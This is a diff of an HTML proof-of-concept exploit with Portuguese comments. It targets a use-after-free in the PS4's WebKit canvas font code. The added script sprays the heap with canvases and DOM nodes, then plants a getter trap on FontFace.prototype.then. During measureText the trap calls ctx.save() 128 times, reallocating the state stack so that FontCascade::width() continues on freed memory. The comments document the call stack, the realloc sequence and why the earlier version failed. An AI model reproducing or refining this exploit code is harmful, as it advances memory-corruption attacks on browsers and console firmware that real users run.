@@ -1,65 +1,146 @@
+
+
 <!DOCTYPE html>
+<!--
+  POC v2: UAF em FontProxy via realloc de m_stateStack
+  ======================================================
+  Bug class  : Use-After-Free (CWE-416)
+  Alvo C++   : FontCascade::width() com 'this' dangling após
+                WTF::Vector<State>::append() realocar m_stateStack
+  Componente : CanvasRenderingContext2DBase (m_stateStack / FontProxy)
+  Versão alvo: libSceNKWebKit.sprx — AppleWebKit/605.1.15 (PS4 FW 13.x/14.x)
+
+  CORREÇÃO v1 → v2:
+  -----------------
+  v1 usava Cherokee \u13A0 como trigger. O PS4 não tem fonte com
+  esse range → WebKit renderiza "tofu" sem passar pelo path de font
+  matching que dispara o thenable check → sem UAF.
+
+  v2 usa 'a' (ASCII) com fonte local() única, igual ao padrão do
+  UAF_CSSSegmentedFontFace_fontRanges.html que confirmou crash no PS4.
+  Com fonte local e glifo presente, o CSSSegmentedFontFace itera o
+  range 'a' e faz o thenable check em face.loaded durante measureText.
+
+  CALL STACK NO MOMENTO DO GETTER:
+  ----------------------------------
+  ctx.measureText('a')                       [JS]
+    CanvasRenderingContext2DBase::measureText [C++]
+      state().font.width(textRun)            [C++]  ← 'this' aponta para
+        FontCascade::width()                 [C++]    m_stateStack.last().font
+          CSSSegmentedFontFace iteration     [C++]
+            [[Get]] face.then               [JSC]
+              getter dispara               [JS]
+                ctx.save() × 128           [JS→C++]
+                  m_stateStack.append()    [C++]
+                    REALLOC → old buffer freed
+              retorna undefined
+          (volta ao C++ com 'this' dangling)
+        continua FontCascade::width()       [C++] ← UAF aqui
+-->
 <html>
-<head><meta charset="utf-8"></head>
+<head>
+  <meta charset="utf-8">
+  <title>UAF FontProxy v2</title>
+</head>
 <body>
-
-<script>
+    <script>
 (function(){const logElement=document.createElement('pre');logElement.id='debug-log';logElement.style.cssText='position: fixed; bottom: 0; left: 0; width: 100%; max-height: 220px; overflow-y: auto; background: rgba(0, 0, 0, 0.85); color: #ff5555; font-family: monospace; font-size: 11px; z-index: 999999; padding: 8px; box-sizing: border-box; margin: 0; border-top: 2px solid #ff0000; text-align: left; white-space: pre-wrap; word-break: break-all;';if(document.body){document.body.appendChild(logElement);}else{document.addEventListener('DOMContentLoaded',()=>document.body.appendChild(logElement));}function log(msg,color='#ff5555'){if(!logElement)return;const line=document.createElement('div');line.style.color=color;line.textContent=msg;logElement.appendChild(line);logElement.scrollTop=logElement.scrollHeight;}window.onerror=function(message,source,lineno,colno,error){log(`[ERRO JS] ${message}\n  -> ${source}:${lineno}:${colno}`);};window.addEventListener('error',function(event){const target=event.target;if(target&&(target.tagName||target===window)){const tagName=target.tagName?target.tagName.toLowerCase():'recurso';const sourceUrl=target.src||target.href||'desconhecido';log(`[FALHA RECURSO/${tagName}] Não foi possível carregar: ${sourceUrl}`,'#ffaa00');}},true);window.addEventListener('unhandledrejection',function(event){log(`[PROMISE REJECTION] ${event.reason}`);});['log','error','warn','info'].forEach(method=>{const original=console[method];console[method]=function(...args){original.apply(console,args);const text=args.map(arg=>{if(typeof arg==='object'){try{return JSON.stringify(arg);}catch(e){return '[Objeto Circular]';}}return arg;}).join(' ');let color='#ffffff';if(method==='error')color='#ff5555';if(method==='warn')color='#ffaa00';log(`[Console.${method}] ${text}`,color);};});log('[Debug Ativo]','#00ff00');})();
-</script>
-
+    </script>
 <script>
-let ctx = null;
-let inGetter = false;
+'use strict';
 
-Object.defineProperty(FontFace.prototype, 'then', {
-    configurable: true,
-    get() {
-        if (inGetter || !ctx)
-            return undefined;
-        inGetter = true;
-        for (let i = 0; i < 16; i++) {
-            try { ctx.measureText('q' + String.fromCharCode(65 + i) + 'z'); } catch (e) { }
-            try { ctx.measureText('x'); } catch (e) { }
-        }
-        inGetter = false;
-        return undefined;
-    }
-});
+function trigger() {
 
-function attempt(n)
-{
-    for (let d = 0; d < 3; d++)
-        new FontFace('Dummy' + n + '_' + d, 'local(Helvetica)');
-
-    const family = 'VarFam' + n;
-    const face = new FontFace(family, 'local(Helvetica)');
-    void face.loaded;
+    // 1. FontFace com local() — fonte imediatamente disponível.
+    //    face.loaded garante inicialização de m_promise internamente.
+    var face = new FontFace('UAFFont', 'local(Helvetica)');
     document.fonts.add(face);
+    void face.loaded;
 
-    // Substituição de OffscreenCanvas por um canvas HTML padrão
-    const canvas = document.createElement('canvas');
-    canvas.width = 10;
-    canvas.height = 10;
-    ctx = canvas.getContext('2d');
-    
-    ctx.font = '20px Helvetica, ' + family;
+    // 2. Pressão de heap: satura o font metrics cache.
+    //    Aumenta chance do buffer liberado ser reutilizado
+    //    com dados de lixo antes do retorno de FontCascade::width().
+    var dummies = [];
+    for (var i = 0; i < 500; i++) {
+        var d = document.createElement('canvas');
+        d.width = 1; d.height = 1;
+        d.getContext('2d').font = '10px "UAFDM' + i + '"';
+        dummies.push(d);
+    }
 
-    for (let i = 0; i < 50; i++)
-        ctx.measureText('x');
+    // 3. Canvas com fonte ÚNICA (sem fallback chain).
+    //    Sem fallback: evita que PS4 descarte a fonte por falta de glifo
+    //    antes de chegar no thenable check.
+    //    Padrão idêntico ao UAF_CSSSegmentedFontFace_fontRanges.html.
+    var canvas = document.createElement('canvas');
+    canvas.width = 64;
+    canvas.height = 64;
+    document.body.appendChild(canvas);
+    var ctx = canvas.getContext('2d');
+    ctx.font = '10px UAFFont';
 
-    // U+E005 is absent from Helvetica, so this walks the fallback list into the pending face.
-        // U+E005 is absent from Helvetica, so this walks the fallback list into the pending face.
-    ctx.measureText('\u13A0\u13A2\u13A4');
-    context.measureText('z');
+    // 4. Getter trap em FontFace.prototype.then
+    //
+    //    Reentrância: ctx.save() × 128
+    //    m_stateStack inicia size=1, capacity≈1 (WTF::Vector).
+    //    1ª chamada save(): size=2 → capacity=2  → REALLOC #1 (libera buffer original)
+    //    2ª save():         size=3 → capacity=4  → REALLOC #2
+    //    3ª/4ª save():      size=5 → capacity=8  → REALLOC #3
+    //    ... (doubling)
+    //    7ª realloc:        size→128, capacity=256
+    //    Todos os buffers intermediários liberados via fastFree().
+    //
+    //    'this' dentro de FontCascade::width() aponta para o buffer
+    //    da 1ª alocação (capacity=1) que é liberado no REALLOC #1.
+    //    Após o getter retornar, qualquer acesso a this->m_fonts,
+    //    this->m_description etc. é UAF.
+    var fired = false;
+    Object.defineProperty(FontFace.prototype, 'then', {
+        configurable: true,
+        get: function() {
+            if (fired) return undefined;
+            fired = true;
+
+            // Realloc de m_stateStack via save() em loop.
+            for (var i = 0; i < 128; i++) {
+                ctx.save();
+            }
+
+            // Alocações C++ (via DOM) para pressionar o allocator
+            // a reutilizar o buffer liberado com novos dados.
+            var fills = [];
+            for (var j = 0; j < 64; j++) {
+                fills.push(document.createElement('span'));
+            }
+
+            return undefined; // não thenable — Promise resolve normalmente
+        }
+    });
+
+    // 5. TRIGGER: 'a' está em Helvetica → font matching completo via
+    //    CSSSegmentedFontFace → thenable check → getter → UAF
+    //    (Mesmo padrão do UAF_CSSSegmentedFontFace_fontRanges.html)
+    ctx.measureText('a');
+
+    // 6. Trigger secundário com tamanhos variados (como no UAF confirmado).
+    //    Se measureText('a') não crashou, tentar diferentes tamanhos
+    //    para pressionar font range resolution como no original.
+    if (!fired) return; // getter não disparou, font path não atingido
+    Object.defineProperty(FontFace.prototype, 'then', {
+        configurable: true,
+        get: function() { return undefined; }
+    });
+    for (var sz = 11; sz <= 50; sz++) {
+        var c2 = document.createElement('canvas');
+        c2.getContext('2d').font = sz + 'px UAFFont';
+        c2.getContext('2d').measureText('a');
+    }
 }
 
-window.onload = function () {
-    setTimeout(function () {
-        for (let n = 0; n < 10; n++) {
-            try { attempt(n); } catch (e) { }
-        }
-        document.body.appendChild(document.createTextNode("PASS if no crash 2 "));        
-    }, 0);
+window.onload = function() {
+    // setTimeout garante inicialização completa do maquinário de fontes.
+    // Padrão idêntico ao UAF_CSSSegmentedFontFace_fontRanges.html.
+    setTimeout(trigger, 0);
 };
 </script>
 </body>
